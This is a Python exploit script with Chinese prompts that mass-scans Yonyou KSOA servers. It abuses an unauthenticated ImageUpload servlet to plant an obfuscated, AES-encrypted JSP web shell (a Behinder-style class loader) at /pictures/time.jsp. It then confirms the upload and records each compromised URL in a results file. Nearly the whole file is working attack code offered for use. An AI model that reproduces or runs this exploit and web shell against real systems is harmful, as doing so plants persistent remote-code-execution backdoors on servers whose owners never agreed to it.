import requests
import argparse
import sys

name_art = r"""
 ██▓     █    ██     ███▄ ▄███▓ ██▓ ███▄    █   ▄████      █████▒▓█████  ██▓
▓██▒     ██  ▓██▒   ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒   ▓██   ▒ ▓█   ▀ ▓██▒
▒██░    ▓██  ▒██░   ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░   ▒████ ░ ▒███   ▒██▒
▒██░    ▓▓█  ░██░   ▒██    ▒██ ░██░▓██▒  ▐▌██▒░▓█  ██▓   ░▓█▒  ░ ▒▓█  ▄ ░██░
░██████▒▒▒█████▓    ▒██▒   ░██▒░██░▒██░   ▓██░░▒▓███▀▒   ░▒█░    ░▒████▒░██░
░ ▒░▓  ░░▒▓▒ ▒ ▒    ░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒     ▒ ░    ░░ ▒░ ░░▓  
░ ░ ▒  ░░░▒░ ░ ░    ░  ░      ░ ▒ ░░ ░░   ░ ▒░  ░   ░     ░       ░ ░  ░ ▒ ░
  ░ ░    ░░░ ░ ░    ░      ░    ▒ ░   ░   ░ ░ ░ ░   ░     ░ ░       ░    ▒ ░
    ░  ░   ░               ░    ░           ░       ░               ░  ░ ░  

"""


def welcome_message():
    print("\n\n\n\n")
    print("-----------欢迎使用批量扫描用友KSOA脚本！-----------")
    print(name_art)
    print("\n")
    print("使用 -u 参数扫描单个网站")
    print("使用 -f 参数扫描文件中的网站")
    print("使用 -t 参数设置扫描的线程")
    print("\n")


header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Accept": "*/*",
    "Connection": "close",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "2004",
}

poc = "/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=time.jsp"
poc2 = "/pictures/time.jsp"

data = r'''
Hello Administrator!
WelCome To Tas9er JSP Console!<%@page import="sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random" %>
<%!
    class govcTe8Acfm extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {
        govcTe8Acfm(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 govFsVuE) {
            super(govFsVuE);
        }
        public Class govk(byte[] govMAyhpPJE53EAk) {
            return super.d\uuuuuuuuu0065fineClass/*govi9Emo1fguHGzQW*/(govMAyhpPJE53EAk,0,govMAyhpPJE53EAk.length);
        }
    }
%><%
    out.println("Random Garbage Data:");
    Random govGSYyt1O6D8XAD = new Random();
    int gov5Q = govGSYyt1O6D8XAD.nextInt(1234);
    int govA = govGSYyt1O6D8XAD.nextInt(5678);
    int govJRqIEUf = govGSYyt1O6D8XAD.nextInt(1357);
    int govtfhbcIAtq9nLGF = govGSYyt1O6D8XAD.nextInt(2468);
    out.println(gov5Q+","+govA+","+govJRqIEUf+","+govtfhbcIAtq9nLGF);
    String[] govT = new String[]{"A", "P", "B", "O", "C", "S", "D", "T"};
    String govYqfHwcB90UJ = govT[1] + govT[3] + govT[5] + govT[7];
    if (request.getMethod().equals(govYqfHwcB90UJ)) {
        String gov5xPwOsgHM3pq0 = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()/*govz483yM*/./*govJyDcaRsiY6*/decodeBuffer/*govEdlUeo6jCVW*/("MTZhY2FjYzA1YWFmYWY2Nw=="));
        session.setAttribute("u", gov5xPwOsgHM3pq0);
        Cipher govto7bPARJgG = Cipher.getInstance("AES");
        govto7bPARJgG.init(((gov5Q * govA + govJRqIEUf - govtfhbcIAtq9nLGF) * 0) + 3 - 1, new SecretKeySpec(gov5xPwOsgHM3pq0.getBytes(), "AES"));
        new govcTe8Acfm(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u0065t\u0043\u006c\u0061\u0073\u0073Loader()).govk(govto7bPARJgG.doFinal(new sun.misc./*gov7*/B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*govRhjtUT*/decodeBuffer(request.getReader().readLine()))).newInstance()/*govGBgPKhqcH94*/.equals(pageContext);
    }
%>
'''


# 验证脚本
def upload(url):
    try:
        res = requests.post(url=url + poc, headers=header, data=data, verify=False, timeout=6)
        if res.status_code != 200:
            print("连接失败！")
            return

        # 验证文件是否上传成功
        confirm = requests.get(url=url + poc2, headers=header, timeout=6)
        if confirm.status_code == 200:
            tips = f"成功！请访问：{url + poc2}验证漏洞！\n"
            print(tips)
            with open("result.txt", "a+") as a:
                a.write(tips)

        else:
            print(f"有错误！错误原因为：{confirm.status_code}\n")
    except requests.exceptions.Timeout:
        print(f"请求超时！跳过 {url}\n")
    except requests.exceptions.ConnectionError:
        print(f"连接错误！跳过 {url}\n")


# 读取文件中的url并进行扫描
def process_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
    for url in urls:
        url = "http://" + url.strip()
        print(f"扫描 {url}")
        upload(url)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        welcome_message()
        args_str = input("请输入参数（例如：'-u 127.0.0.1'）：")
        args = args_str.split()
    else:
        args = sys.argv[1:]

    parser = argparse.ArgumentParser(description="KSOA漏洞POC")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", type=str, help="包含URL的文件")
    group.add_argument("-u", "--url", type=str, help="单个URL地址")

    args = parser.parse_args(args)

    if args.file:
        process_file(args.file)
    else:
        url = "http://" + args.url.strip()
        upload(url)
